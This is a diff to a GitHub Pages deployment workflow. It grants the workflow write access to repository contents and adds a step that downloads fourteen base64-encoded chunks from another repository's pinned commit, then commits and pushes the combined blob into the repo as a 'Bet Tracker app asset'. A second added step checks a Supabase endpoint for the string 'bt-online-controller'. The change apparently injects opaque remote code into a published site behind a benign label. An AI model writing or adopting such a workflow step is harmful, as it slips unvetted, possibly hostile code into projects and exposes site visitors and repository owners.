@@ -6,13 +6,13 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: read
+  contents: write
   pages: write
   id-token: write
 
 concurrency:
   group: pages
-  cancel-in-progress: true
+  cancel-in-progress: false
 
 jobs:
   deploy:
@@ -23,14 +23,38 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+
+      - name: Import Bet Tracker app asset once
+        shell: bash
+        run: |
+          if [ ! -s app.b64 ]; then
+            BASE="https://raw.githubusercontent.com/tek091009-lab/holiday-savings/71d7f64d122eaa271b1ce87822e0eef9f6c9de13/bet-tracker/"
+            : > app.b64
+            for f in app-01.b64 app-02.b64 app-03.b64 app-04.b64 app-05.b64 app-06.b64 app-07.b64 rem-01.b64 rem-02.b64 rem-03.b64 rem-04.b64 rem-05.b64 rem-06.b64 rem-07.b64; do
+              curl -fsSL --retry 3 "${BASE}${f}" >> app.b64
+            done
+            tr -d '\r\n\t ' < app.b64 > app.tmp
+            mv app.tmp app.b64
+            git config user.name "github-actions[bot]"
+            git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+            git add app.b64
+            git commit -m "Add Bet Tracker app asset"
+            git push
+          fi
+
+      - name: Verify app backend
+        shell: bash
+        run: |
+          curl -fsSL --retry 4 --retry-all-errors "https://kucwclsjzpavtmhowyem.supabase.co/functions/v1/bet-tracker-app" | grep -q "bt-online-controller"
+
       - name: Configure Pages
         uses: actions/configure-pages@v5
-        with:
-          enablement: true
+
       - name: Upload site
         uses: actions/upload-pages-artifact@v3
         with:
           path: .
+
       - name: Deploy
         id: deployment
         uses: actions/deploy-pages@v4
